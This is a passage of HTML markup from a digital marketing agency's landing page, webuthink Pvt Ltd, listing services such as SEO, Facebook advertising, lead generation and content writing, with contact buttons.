														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-4">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title tiny custom_icon_image center '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/planning.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="wp-content/uploads/2020/06/planning.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h3 class="icon_title"
																						style="color: #000000;font-weight: 400;">
																						Customized Advertising Approach
																					</h3>
																					<div class="separator  small left  "
																						style="margin-top: 0px;margin-bottom: 15px;background-color: #29364a;height: 2px;width: 20px;">
																					</div>
																					<p style='color: #000000'>Based on
																						the customer's preferences and
																						purchasing habits, internet
																						marketing allows you to
																						customize their websites.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-4">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title tiny custom_icon_image center '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/instant-coffee.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="wp-content/uploads/2020/06/instant-coffee.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h3 class="icon_title"
																						style="color: #000000;font-weight: 400;">
																						Instant Transaction Service</h3>
																					<div class="separator  small left  "
																						style="margin-top: 0px;margin-bottom: 15px;background-color: #29364a;height: 2px;width: 20px;">
																					</div>
																					<p style='color: #000000'>
																						Transactions are simple and
																						almost quickly completed
																						digitally, and you can do it via
																						a digital payment gateway.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-4">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title tiny custom_icon_image center '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/relationship.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="wp-content/uploads/2020/06/relationship.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h3 class="icon_title"
																						style="color: #000000;font-weight: 400;">
																						Better Sales Relationship</h3>
																					<div class="separator  small left  "
																						style="margin-top: 0px;margin-bottom: 15px;background-color: #29364a;height: 2px;width: 20px;">
																					</div>
																					<p style='color: #000000'>With
																						internet marketing where
																						marketers can quickly obtain
																						their leads and customer's email
																						addresses that they can use to
																						reach out and develop a consumer
																						relationship.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</section>
							<div class="vc_row wpb_row section vc_row-fluid  vc_custom_1592043243543 grid_section"
								style=' text-align:left;'>
								<div class=" section_inner clearfix">
									<div class='section_inner_margin clearfix'>
										<div class="wpb_column vc_column_container vc_col-sm-12">
											<div class="vc_column-inner">
												<div class="wpb_wrapper">
													<div class="vc_row wpb_row section vc_row-fluid vc_inner "
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-12">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_text_column wpb_content_element ">
																			<div class="wpb_wrapper">
																				<h2 class="wow fadeInLeft animated"
																					style="text-align: center;"
																					data-wow-delay=".1s"><span
																						style="color: #ffffff;">Internet
																						Marketing Solutions </span></h2>

																			</div>
																		</div>
																		<div
																			class="wpb_text_column wpb_content_element  vc_custom_1592195201144">
																			<div class="wpb_wrapper">
																				<p style="text-align: center;"><span
																						style="color: #ffffff;">webuthink
																						Pvt Ltd is a leading digital
																						marketing agency which is
																						focusing on effectively
																						increasing the business through
																						online website marketing
																						services. If you&#8217;re trying
																						to improve sales or visits to
																						your page in your area, then we
																						will help you develop the same
																						with some of the best
																						services.</span></p>

																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
													<div class="vc_row wpb_row section vc_row-fluid vc_inner  control-frist-services vc_custom_1591883117536"
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-6">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title large custom_icon_image '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/laptop.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="wp-content/uploads/2020/06/laptop.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h3 class="icon_title"
																						style="color: #ffffff;font-weight: 400;">
																						Content Writing</h3>
																					<p style='color: #ffffff'>We provide
																						you with plagiarism-free and
																						high-quality SEO optimized
																						content regularly for creating a
																						voice for your business.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-6">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title large custom_icon_image '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/generation.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="wp-content/uploads/2020/06/generation.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h3 class="icon_title"
																						style="color: #ffffff;font-weight: 200;">
																						Lead Generation</h3>
																					<p style='color: #ffffff'>We carry
																						on the time-consuming activities
																						of identifying and assessing
																						your future customers. Using our
																						expert knowledge across multiple
																						channels, we're accelerating
																						your sales to increase your
																						revenue.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
													<div class="vc_row wpb_row section vc_row-fluid vc_inner  control-why-c-box-control control-frist-services vc_custom_1591882318096"
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-6">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title large custom_icon_image '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/social-networks.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="wp-content/uploads/2020/06/social-networks.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h3 class="icon_title"
																						style="color: #ffffff;font-weight: 200;">
																						Facebook Marketing</h3>
																					<p style='color: #ffffff'>Facebook
																						is an enormously popular social
																						networking medium for promoting
																						your business with dedication
																						and commitment around the world.
																					</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-6">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title large custom_icon_image '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/home.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="wp-content/uploads/2020/06/home.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h3 class="icon_title"
																						style="color: #ffffff;font-weight: 200;">
																						Local SEO</h3>
																					<p style='color: #ffffff'>With local
																						search engine optimization from
																						one of the best local SEO
																						Company, you can now reach out
																						to the users in your area.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
							<div class="vc_row wpb_row section vc_row-fluid  vc_custom_1592043952438"
								style=' text-align:left;'>
								<div class=" full_section_inner clearfix">
									<div class="wpb_column vc_column_container vc_col-sm-12">
										<div class="vc_column-inner">
											<div class="wpb_wrapper">
												<div class="vc_row wpb_row section vc_row-fluid vc_inner  vc_custom_1591870685248 grid_section"
													style=' text-align:center;'>
													<div class=" section_inner clearfix">
														<div class='section_inner_margin clearfix'>
															<div class="wpb_column vc_column_container vc_col-sm-12">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_text_column wpb_content_element ">
																			<div class="wpb_wrapper">
																				<h2
																					style="text-align: center; font-size: 46px; color: #fff; font-weight: 500;">
																					<span style="color: #000000;">WANT
																						MORE SALES?</span></h2>

																			</div>
																		</div>
																		<div
																			class="wpb_text_column wpb_content_element ">
																			<div class="wpb_wrapper">
																				<p
																					style="text-align: center; color: #dfdfdf; font-size: 18px; font-weight: 600; padding: 10px 0px;">
																					<span style="color: #000000;">Get
																						your</span> <span
																						style="color: #ed8420;">FREE
																						Proposal</span> <span
																						style="color: #000000;">on how
																						we can help you with
																						that!</span></p>

																			</div>
																		</div>
																		<div class="separator call-to-sepppp normal   "
																			style="background-color: #729abf;"></div>
																		<a itemprop="url" href="#contact" target="_self"
																			data-hover-background-color='#29364a'
																			data-hover-border-color='#29364a'
																			data-hover-color='#ffffff'
																			class="qbutton  large center default control-call-to-action-btnm"
																			style="color: #ffffff; border-color: #ed8420; background-color: #ed8420;">Get
																			started Now!</a>
																		<div
																			class="wpb_text_column wpb_content_element  vc_custom_1592043991868">
																			<div class="wpb_wrapper">
																				<p style="text-align: center;"><span
																						style="color: #999999;"><a
																							style="font-size: 15px; color: #999999; font-style: italic;"
																							href="tel:+91-8285635636">Have
																							a question? Call us on
																							+91-8285635636</a></span>
																				</p>

																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
							<div id="Why"
								class="vc_row wpb_row section vc_row-fluid  vc_custom_1592391909699 grid_section"
								style=' text-align:left;'>
								<div class=" section_inner clearfix">
									<div class='section_inner_margin clearfix'>
										<div class="wpb_column vc_column_container vc_col-sm-12">
											<div class="vc_column-inner">
												<div class="wpb_wrapper">
													<div class="vc_row wpb_row section vc_row-fluid vc_inner "
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-12">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_text_column wpb_content_element ">
																			<div class="wpb_wrapper">
																				<h2 class="wow fadeInLeft animated"
																					style="text-align: center;"
																					data-wow-delay=".1s"><span
																						style="color: #ffffff;">Why
																						choose us</span></h2>

																			</div>
																		</div>
																		<div
																			class="wpb_text_column wpb_content_element  vc_custom_1593773449258">
																			<div class="wpb_wrapper">
																				<p style="text-align: center;"><span
																						style="color: #ffffff;">Welcome
																						to the most reliable<strong>
																							Internet marketing service
																							provider company</strong>.
																						webuthink Pvt Ltd provides
																						outstanding business promotion
																						service through our online
																						marketing services to the
																						clients. If you&#8217;re ready
																						to grow your company and become
																						a leader, then you don&#8217;t
																						need to go any further. Below is
																						a brief list of what makes us
																						stand out from our
																						competitors.</span></p>

																			</div>
																		</div>
																		<div class="separator  normal   "
																			style="background-color: #5c5c5c;"></div>
																	</div>
																</div>
															</div>
														</div>
													</div>
													<div class="vc_row wpb_row section vc_row-fluid vc_inner  control-why-c-box-control vc_custom_1591873095192"
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-4">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title medium custom_icon_image '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/heart-1.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="wp-content/uploads/2020/06/heart-1.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h4 class="icon_title"
																						style="color: #ffffff;font-weight: 600;">
																						Passionate about work</h4>
																					<p style='color: #ffffff'>Strong
																						passion for creativity and
																						innovation makes us an excellent
																						partner for digital marketing.
																					</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-4">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title medium custom_icon_image '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/gift.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="wp-content/uploads/2020/06/gift.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h4 class="icon_title"
																						style="color: #ffffff;font-weight: 600;">
																						Value-Added Services</h4>
																					<p style='color: #ffffff'>We offer
																						the very best service to all our
																						clients at a reasonable price.
																					</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-4">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title medium custom_icon_image '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/aim.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="wp-content/uploads/2020/06/aim.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h4 class="icon_title"
																						style="color: #ffffff;font-weight: 600;">
																						Focus on ROI</h4>
																					<p style='color: #ffffff'>Our
																						clients will see a positive ROI
																						within the first 3 months of
																						starting campaigns with us.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
													<div class="vc_row wpb_row section vc_row-fluid vc_inner  control-why-c-box-control vc_custom_1591873095192"
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-4">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title medium custom_icon_image '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/high-five.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="wp-content/uploads/2020/06/high-five.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h4 class="icon_title"
																						style="color: #ffffff;font-weight: 600;">
																						Gamut of Services Available</h4>
																					<p style='color: #ffffff'>We're a
																						comprehensive digital marketing
																						firm with a wide range of
																						services to offer.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-4">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title medium custom_icon_image '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/headphone.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="wp-content/uploads/2020/06/headphone.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h4 class="icon_title"
																						style="color: #ffffff;font-weight: 600;">
																						Seamless Customer Service</h4>
																					<p style='color: #ffffff'>We have a
																						customer service department that
																						deals with our clients for
																						seamless connectivity.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-4">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title medium custom_icon_image '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/customer-service.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="wp-content/uploads/2020/06/customer-service.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h4 class="icon_title"
																						style="color: #ffffff;font-weight: 600;">
																						Customized Services</h4>
																					<p style='color: #ffffff'>We
																						customize our marketing
																						strategies to fit the specific
																						goals, scale, and budget of the
																						client.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
							<div id="Services"
								class="vc_row wpb_row section vc_row-fluid  vc_custom_1592049365005 grid_section"
								style=' text-align:left;'>
								<div class=" section_inner clearfix">
									<div class='section_inner_margin clearfix'>
										<div class="wpb_column vc_column_container vc_col-sm-12">
											<div class="vc_column-inner">
												<div class="wpb_wrapper">
													<div class="vc_row wpb_row section vc_row-fluid vc_inner "
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-12">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_text_column wpb_content_element ">
																			<div class="wpb_wrapper">
																				<h2 class="wow fadeInLeft animated"
																					style="text-align: center;"
																					data-wow-delay=".1s"><span
																						style="color: #000000;">Wide
																						Range of Online Marketing
																						Services</span></h2>

																			</div>
																		</div>
																		<div
																			class="wpb_text_column wpb_content_element  vc_custom_1592195481712">
																			<div class="wpb_wrapper">
																				<p style="text-align: center;"><span
																						style="color: #000000;">We are a
																						digital marketing company that
																						provides, innovative and
																						comprehensive digital marketing
																						services along with social media
																						management, Facebook
																						advertising, local business
																						promotion, website maintenance,
																						and many more.</span></p>

																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
													<div class="vc_row wpb_row section vc_row-fluid vc_inner  control-services-two"
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-3">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title small custom_icon_image center '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/project-management.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="./image/project-management.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h3 class="icon_title"
																						style="color: #000000;font-weight: 400;">
																						Social Media Management</h3>
																					<p style='color: #000000'>We are a
																						complete stack marketing company
																						offering social media management
																						services focusing on your sales,
																						leads, &amp; growth.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-3">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title small custom_icon_image center '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/credibility.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="./image/credibility.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h3 class="icon_title"
																						style="color: #000000;font-weight: 400;">
																						Online Reputation Management
																					</h3>
																					<p style='color: #000000'>ORM helps
																						businesses in promoting positive
																						content to the audience for
																						gaining more traffic.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-3">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title small custom_icon_image center '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/online-banking.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="./image/online-banking.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h3 class="icon_title"
																						style="color: #000000;font-weight: 400;">
																						Global SEO</h3>
																					<p style='color: #000000'>Global
																						search engine optimization is a
																						technique used to create a
																						global target for your service,
																						product, or business.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-3">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title small custom_icon_image center '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/laptop-1.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="./image/laptop-1.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h3 class="icon_title"
																						style="color: #000000;font-weight: 400;">
																						Content Marketing</h3>
																					<p style='color: #000000'>With over
																						more than a thousand articles,
																						our content writing team will
																						get the SEO-friendly content for
																						your site to rank higher.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
													<div class="vc_row wpb_row section vc_row-fluid vc_inner  control-services-two vc_custom_1591886282652"
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-3">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title small custom_icon_image center '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/web-optimization.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="./image/web-optimization.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h3 class="icon_title"
																						style="color: #000000;font-weight: 400;">
																						Website Maintenance</h3>
																					<p style='color: #000000'>Your
																						website is the face of the
																						company and it is important to
																						keep it updated, informative and
																						well optimized with regular web
																						maintenance services</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-3">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title small custom_icon_image center '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/search-1.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="./image/search-1.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h3 class="icon_title"
																						style="color: #000000;font-weight: 400;">
																						Search Engine Marketing</h3>
																					<p style='color: #000000'>Search
																						engine marketing is the method
																						by which you promote your goods
																						or services so that they are
																						visible on SERPs.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-3">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title small custom_icon_image center '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/social-networks-1.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="wp-content/uploads/2020/06/social-networks-1.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h3 class="icon_title"
																						style="color: #000000;font-weight: 400;">
																						Facebook Advertising</h3>
																					<p style='color: #000000'>Through
																						using our Facebook advertisement
																						services, you will generate a
																						great deal of business at low
																						costs and make enormous returns
																						for the company.</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-3">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title small custom_icon_image center '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/local.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="./image/local.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h3 class="icon_title"
																						style="color: #000000;font-weight: 400;">
																						Local Business Promotion</h3>
																					<p style='color: #000000'>With us,
																						you can now reach your target
																						audience and promote your
																						business locally getting listed
																						on Google Maps and many more.
																					</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
							<div class="vc_row wpb_row section vc_row-fluid  mar-t-call-to vc_custom_1592044210734"
								style=' text-align:left;'>
								<div class=" full_section_inner clearfix">
									<div class="wpb_column vc_column_container vc_col-sm-12">
										<div class="vc_column-inner">
											<div class="wpb_wrapper">
												<div class="vc_row wpb_row section vc_row-fluid vc_inner  control-my-call-to-a vc_custom_1591876258275 grid_section"
													style=' text-align:left;'>
													<div class=" section_inner clearfix">
														<div class='section_inner_margin clearfix'>
															<div class="wpb_column vc_column_container vc_col-sm-8">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_text_column wpb_content_element ">
																			<div class="wpb_wrapper">
																				<h2
																					style="text-align: center; font-size: 46px; color: #fff; font-weight: 400;">
																					<span style="color: #ed8420;">Ready
																						to discuss your project?</span>
																				</h2>

																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div
																class="control-my-left-btttnn wpb_column vc_column_container vc_col-sm-4">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div class="vc_empty_space"
																			style="height: 10px"><span
																				class="vc_empty_space_inner">
																				<span class="empty_space_image"></span>
																			</span></div>

																		<a itemprop="url" href="#contact" target="_self"
																			data-hover-background-color='#29364a'
																			data-hover-border-color='#29364a'
																			data-hover-color='#ffffff'
																			class="qbutton  large center default control-call-to-action-btnm"
																			style="color: #ffffff; border-color: #ed8420; background-color: #ed8420;">Contact
																			Now</a>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
							<div id="Our"
								class="vc_row wpb_row section vc_row-fluid  vc_custom_1592391934323 grid_section"
								style=' text-align:left;'>
								<div class=" section_inner clearfix">
									<div class='section_inner_margin clearfix'>
										<div
											class="wpb_column vc_column_container vc_col-sm-12 vc_hidden-sm vc_hidden-xs">
											<div class="vc_column-inner">
												<div class="wpb_wrapper">
													<div class="vc_row wpb_row section vc_row-fluid vc_inner "
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-12">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_text_column wpb_content_element  vc_custom_1591944291601">
																			<div class="wpb_wrapper">
																				<h2 class="wow fadeInLeft animated"
																					style="text-align: center;"
																					data-wow-delay=".1s"><span
																						style="color: #ffffff;">Our
																						Working Areas</span></h2>

																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
													<div class="vc_row wpb_row section vc_row-fluid vc_inner "
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-3">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_raw_code wpb_content_element wpb_raw_html">
																			<div class="wpb_wrapper">
																				<div class="industries_area invrt_clr"
																					data-colors="#ee7730,#15243A">
																					<div class="industries_img_area"
																						style="fill: #15243a;">
																						<div class="industries_main_img"
																							style="fill: #15243a;">
																							<figure
																								style="fill: #15243a;">
																								<i class="fa fa-university"
																									aria-hidden="true"></i>
																							</figure>
																						</div>
																					</div>
																					<p><a style="fill: #ee7730;"
																							href="#">Educational
																							Institutes</a></p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-3">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_raw_code wpb_content_element wpb_raw_html">
																			<div class="wpb_wrapper">
																				<div class="industries_area invrt_clr"
																					data-colors="#ee7730,#15243A">
																					<div class="industries_img_area"
																						style="fill: #15243a;">
																						<div class="industries_main_img"
																							style="fill: #15243a;">
																							<figure
																								style="fill: #15243a;">
																								<i class="fa fa-briefcase"
																									aria-hidden="true"></i>
																							</figure>
																						</div>
